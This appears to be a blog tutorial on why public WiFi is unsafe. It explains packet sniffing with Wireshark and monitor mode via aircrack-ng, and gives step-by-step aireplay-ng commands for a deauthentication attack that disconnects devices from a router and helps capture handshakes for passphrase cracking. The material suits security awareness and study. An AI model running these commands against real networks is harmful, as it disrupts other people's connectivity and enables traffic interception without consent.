# But why is a public wifi unsafe?

You might have heard that sensitive information like credit card credentials, login credentials for a website etc. should not be entered while using public wifi network. But why is it so? Okay, so someone can access the data we enter, but is it practically feasible? If yes, how can we do it? Well, in this post we are going to discuss on how can you analyse the network traffic. 

# Background
Okay so let's start with some basics first. There are a lot of devices around us emitting signals, but we'll mainly focus on two of them - the routers and the devices that are used to access the internet such as a smartphone or a laptop. The communication between them follows the **IEEE 802.11** standard. But what does that even mean? So whenever some data is to be transmitted, there has to be a set of rules to which the transmission data adheres, to ensure uniformity. For example, the requests over the **world wide web** follow the `HTTP` protocol in general. In the same way, communications for WiFi networks follow the **IEEE 802.11** standard protocol.<br>
The way your device catches these signals is via a Network Adapter (for example, your laptop might have one of Realtek or Broadcom). To view these signals around you, you need a network monitoring software. Although there are a lot of them, but Wireshark is a good choice and in this post we'll be using it.


# Basics of Wireshark
If you do not have wireshark installed on your laptop, download it from [here](https://www.wireshark.org/download.html).<br>
The video below covers the this topic pretty nicely, however there are a few things I would like to elaborate upon.
<figure class="video_container">
  <iframe src="https://www.youtube.com/watch?v=Hl0IpoS503A" frameborder="0" allowfullscreen="true"> </iframe>
</figure>

<br>

## Monitor Mode
So for the interesting part, that is capturing network traffic of the devices connected to your network, we need to switch on the monitor mode. So what this mode actually does is use the network card in your laptop/PC to capture all the signals being transmitted, and you can see them in wireshark. But all the data is encrypted and to decrypt the data, we need a couple of things- **the WiFi passphrase** and **the EAPOL Handshake**(I'll be talking about it in a minute). So that's where the problem with **Open WiFi** comes in. The data is **NOT** encrypted!! Unless the site you are visiting uses `HTTPS` for transmission, all the data is visible to the intercepter. Also, the intercepter can view what domains you visit, what apps you open, who is the manufacturer of the device, and  what is your mobile operating system.

### Turning on the Monitor Mode
* You need to have `aircrack-ng` installed on your system. There are other ways as well, but using `aircrack-ng` is preferred because you'll be able to do a lot of other stuff as well with it.<br>
`sudo apt install aircrack-ng`
* Run the command `iwconfig`. This will tell you what your wireless card is called (most likely it will be `wlan0`).
* Run `airmon-ng start wlan0`. Now this will turn on the monitoring mode. You will be disconnected from the WiFi and now you can open wireshark to observe the traffic.
* Once you are done, you need to turn off monitoring mode. For that run `iwconfig` again to check what is the name assigned to your wireless card in monitoring mode (usually it is `wlan0mon`). Then run `airmon-ng stop wlan0mon`.

## EAPOL Handshake
In the previous section, we talked about EAPOL handshake. So what is it and why do we need it? What happens is, when a device connects to a WiFi network, there is a key exchange between the router and the client that encrypts all of the communication thereafter. The reason it is needed is if you want to see what the traffic from that device contains or you want to crack the router's passphrase, you'll need these these keys. Formally this process is known as **4-way handshake** and **EAPOL** is the name of protocol used for exhanging the keys. You can read more about it [here](https://www.wifi-professionals.com/2019/01/4-way-handshake).<br>
So if these keys are needed for decryption and can be captured only when a device connects to a network, isn't it tough to get them? Well, the answer is no. There is something known as a deuathentication attack.

## Deauthentication attack
Now we enter one of the most interesting parts of the post. Have you ever had someone using your network and taking up all the bandwidth and you just want to kick them out (from the network) ? Well, this attack does exactly that. You can kick any (or all) devices connected to a router.

### Performing Deauthentication attack
* Turn on the monitor mode as described above.
* Run `airdump-ng wlan0mon`. This command will give you a list of routers available in your vicinity. Note down the `BSSID` and the `channel number (CH)` of the desired router. 
* Run `airodump-ng wlan0mon --bssid [router's BSSID here] --channel [router's channel here]` and you will get a list of devices connected to the router. If there is a particular device you need to disconnect, note down its [MAC Address](https://en.wikipedia.org/wiki/MAC_address).
* Now the final part, run `aireplay-ng --deauth 0 -c [DEVICES MAC ADDRESS] -a [ROUTERS MAC ADDRESS] wlan0mon`. If you skip the `-c` flag part, it deuathenticates all devices connected to the router. The devices won't be able to connect again unless you stop the attack by pressing `Control+C`.


# Conclusion
All the network traffic around you can be monitored pretty easily, but to decrypt it and actually make sense out of it you need an open network or access to the passphrase. All your information is safe unless the sites you are using do not use `HTTPS` protocol (i.e. they do not have a lock sign on the left of the url). But still, you would not like to enter passwords on sites that have `HTTP` protocol, because the attacker can gain access to that and you might be using the same password on other sites as well. And anyways the sites that you visit will be visible to the attacker irrespective of the protocol being used. 









